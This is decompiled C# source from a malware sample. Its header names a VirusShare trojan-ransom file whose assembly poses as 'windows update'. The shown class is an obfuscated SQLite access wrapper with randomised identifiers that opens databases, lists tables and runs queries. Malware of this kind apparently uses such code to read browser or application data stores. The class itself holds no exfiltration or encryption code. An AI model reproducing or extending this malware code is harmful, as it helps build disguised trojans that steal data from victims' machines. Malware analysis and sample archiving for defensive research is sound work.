// Decompiled with JetBrains decompiler
// Type: 0dB18dsp5.rt24SCEsioq60
// Assembly: windows update, Version=3.6.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 445080FA-1CC7-4DA1-9427-19395D9A00B4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00019-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-29e5564982bb1830b28be348277034c5eee2c4ba11f58a12a9d27b78a3b3ba12.exe

using \u0030dB18dsp5;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Data;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0030dB18dsp5
{
  public class rt24SCEsioq60
  {
    private const int SQL_OK = 0;
    private const int SQL_ROW = 100;
    private const int SQL_DONE = 101;
    private IntPtr FHo6cudX183;

    public rt24SCEsioq60() => this.FHo6cudX183 = IntPtr.Zero;

    public rt24SCEsioq60(string baseName) => this.baXOUiuM258(baseName);

    [DllImport("kernel32", EntryPoint = "HeapAlloc")]
    private static extern IntPtr Zwhdpbb7wCh239(IntPtr heap, uint flags, uint bytes);

    [DllImport("kernel32", EntryPoint = "GetProcessHeap")]
    private static extern IntPtr EzbHeFpUcpE240();

    [DllImport("kernel32", EntryPoint = "lstrlen")]
    private static extern int l7GYFovLKOb241(IntPtr str);

    [DllImport("sqlite3", EntryPoint = "sqlite3_open")]
    private static extern int yGCqg4v5yjX242(IntPtr fileName, out IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_close")]
    private static extern int \u0039OtSbnZ2nc0243(IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_exec")]
    private static extern int ka9xqwMCLSs244(
      IntPtr database,
      IntPtr query,
      IntPtr callback,
      IntPtr arguments,
      out IntPtr errorr);

    [DllImport("sqlite3", EntryPoint = "sqlite3_errmsg")]
    private static extern IntPtr t0v5Opko6Rk245(IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_prepare_v2")]
    private static extern int nYSvMd7LHqZ246(
      IntPtr database,
      IntPtr query,
      int length,
      out IntPtr statement,
      out IntPtr tail);

    [DllImport("sqlite3", EntryPoint = "sqlite3_step")]
    private static extern int ylrgJEZjWy5247(IntPtr statement);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_count")]
    private static extern int Glsn5zAIZ69248(IntPtr statement);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_name")]
    private static extern IntPtr \u0030MbEVJzuZb2249(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_type")]
    private static extern int ts9DxFGpNVL250(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_int")]
    private static extern int ihx2o7xbZrT251(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_double")]
    private static extern double okF54IfJrzT252(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_text")]
    private static extern IntPtr ER0dr2U1zie253(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_blob")]
    private static extern IntPtr etU7TlrXNbB254(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_bytes")]
    private static extern IntPtr A3PYsBY9255(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_table_name")]
    private static extern IntPtr \u0033tcoCG1b256(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_finalize")]
    private static extern int GvhXRAa6257(IntPtr handle);

    public void baXOUiuM258(string baseName)
    {
      if (rt24SCEsioq60.yGCqg4v5yjX242(this.TwXKx2gt265(baseName), out this.FHo6cudX183) != 0)
      {
        this.FHo6cudX183 = IntPtr.Zero;
        throw new Exception("Error with opening database " + baseName + "!");
      }
    }

    public void I3gWosAj259()
    {
      if (!(this.FHo6cudX183 != IntPtr.Zero))
        return;
      rt24SCEsioq60.\u0039OtSbnZ2nc0243(this.FHo6cudX183);
    }

    public ArrayList \u0033qfK25hq260()
    {
      DataTable dataTable = this.TINhD9fK262("SELECT name FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'UNION ALL SELECT name FROM sqlite_temp_master WHERE type IN ('table','view') ORDER BY 1");
      ArrayList arrayList = new ArrayList();
      try
      {
        foreach (DataRow row in dataTable.Rows)
          arrayList.Add((object) row.ItemArray[0].ToString());
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return arrayList;
    }

    public void RaLrveJ0261(string query)
    {
      IntPtr errorr;
      rt24SCEsioq60.ka9xqwMCLSs244(this.FHo6cudX183, this.TwXKx2gt265(query), IntPtr.Zero, IntPtr.Zero, out errorr);
      if (errorr != IntPtr.Zero)
        throw new Exception("Error with executing non-query: \"" + query + "\"!\n" + this.jg3FEjFU266(rt24SCEsioq60.t0v5Opko6Rk245(errorr)));
    }

    public DataTable TINhD9fK262(string query)
    {
      IntPtr statement;
      rt24SCEsioq60.nYSvMd7LHqZ246(this.FHo6cudX183, this.TwXKx2gt265(query), this.nxxxkhFt268(this.TwXKx2gt265(query)), out statement, out IntPtr _);
      DataTable table = new DataTable();
      int num = this.ZpGzp5Md263(statement, ref table);
      while (num == 100)
        num = this.UYUrkp36264(statement, ref table);
      rt24SCEsioq60.GvhXRAa6257(statement);
      return table;
    }

    private int ZpGzp5Md263(IntPtr statement, ref DataTable table)
    {
      table = new DataTable("resultTable");
      if (rt24SCEsioq60.ylrgJEZjWy5247(statement) == 100)
      {
        int num1 = rt24SCEsioq60.Glsn5zAIZ69248(statement);
        object[] objArray = new object[checked (num1 - 1 + 1)];
        int num2 = checked (num1 - 1);
        int columnNumber = 0;
        while (columnNumber <= num2)
        {
          string columnName = this.jg3FEjFU266(rt24SCEsioq60.\u0030MbEVJzuZb2249(statement, columnNumber));
          int num3 = rt24SCEsioq60.ts9DxFGpNVL250(statement, columnNumber);
          if (num3 == Conversion.Fix(1))
          {
            table.Columns.Add(columnName, Type.GetType("System.Int32"));
            objArray[columnNumber] = (object) rt24SCEsioq60.ihx2o7xbZrT251(statement, columnNumber);
          }
          else if (num3 == Conversion.Fix(2))
          {
            table.Columns.Add(columnName, Type.GetType("System.Single"));
            objArray[columnNumber] = (object) rt24SCEsioq60.okF54IfJrzT252(statement, columnNumber);
          }
          else if (num3 == Conversion.Fix(3))
          {
            table.Columns.Add(columnName, Type.GetType("System.String"));
            objArray[columnNumber] = (object) this.jg3FEjFU266(rt24SCEsioq60.ER0dr2U1zie253(statement, columnNumber));
          }
          else if (num3 == Conversion.Fix(4))
          {
            table.Columns.Add(columnName, Type.GetType("System.Array"));
            int siz = (int) rt24SCEsioq60.A3PYsBY9255(statement, columnNumber);
            objArray[columnNumber] = (object) this.auLCoH1M267(rt24SCEsioq60.etU7TlrXNbB254(statement, columnNumber), siz);
          }
          else
          {
            table.Columns.Add(columnName, Type.GetType("System.String"));
            objArray[columnNumber] = (object) "";
          }
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
      }
      return rt24SCEsioq60.ylrgJEZjWy5247(statement);
    }

    private int UYUrkp36264(IntPtr statement, ref DataTable table)
    {
      int num1;
      try
      {
        int num2 = rt24SCEsioq60.Glsn5zAIZ69248(statement);
        object[] objArray = new object[checked (num2 - 1 + 1)];
        int num3 = checked (num2 - 1);
        int columnNumber = 0;
        while (columnNumber <= num3)
        {
          int num4 = rt24SCEsioq60.ts9DxFGpNVL250(statement, columnNumber);
          if (num4 == Conversion.Fix(1))
            objArray[columnNumber] = (object) rt24SCEsioq60.ihx2o7xbZrT251(statement, columnNumber);
          else if (num4 == Conversion.Fix(2))
            objArray[columnNumber] = (object) rt24SCEsioq60.okF54IfJrzT252(statement, columnNumber);
          else if (num4 == Conversion.Fix(3))
            objArray[columnNumber] = (object) this.jg3FEjFU266(rt24SCEsioq60.ER0dr2U1zie253(statement, columnNumber));
          else if (num4 == Conversion.Fix(4))
          {
            int siz = (int) rt24SCEsioq60.A3PYsBY9255(statement, columnNumber);
            objArray[columnNumber] = (object) this.auLCoH1M267(rt24SCEsioq60.etU7TlrXNbB254(statement, columnNumber), siz);
          }
          else
            objArray[columnNumber] = (object) "";
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
        num1 = rt24SCEsioq60.ylrgJEZjWy5247(statement);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return num1;
    }

    private IntPtr TwXKx2gt265(string str)
    {
      if (str == null)
        return IntPtr.Zero;
      byte[] bytes1 = Encoding.UTF8.GetBytes(str);
      int bytes2 = checked (bytes1.Length + 1);
      IntPtr num = rt24SCEsioq60.Zwhdpbb7wCh239(rt24SCEsioq60.EzbHeFpUcpE240(), 0U, checked ((uint) bytes2));
      Marshal.Copy(bytes1, 0, num, bytes1.Length);
      Marshal.WriteByte(num, bytes1.Length, (byte) 0);
      return num;
    }

    private string jg3FEjFU266(IntPtr ptr)
    {
      if (ptr == IntPtr.Zero)
        return (string) null;
      Encoding utF8 = Encoding.UTF8;
      int num = this.nxxxkhFt268(ptr);
      byte[] numArray = new byte[checked (num - 1 + 1)];
      Marshal.Copy(ptr, numArray, 0, num);
      return utF8.GetString(numArray, 0, num);
    }

    private Array auLCoH1M267(IntPtr ptr, int siz)
    {
      if (ptr == IntPtr.Zero)
        return (Array) null;
      Encoding utF8 = Encoding.UTF8;
      this.nxxxkhFt268(ptr);
      byte[] destination = new byte[checked (siz - 1 + 1)];
      Marshal.Copy(ptr, destination, 0, siz);
      return (Array) destination;
    }

    private int nxxxkhFt268(IntPtr ptr) => ptr == IntPtr.Zero ? 0 : rt24SCEsioq60.l7GYFovLKOb241(ptr);

    public enum \u0039cf916yB61
    {
      INT = 1,
      FLOAT = 2,
      TEXT = 3,
      BLOB = 4,
      NULL = 5,
    }
  }
}
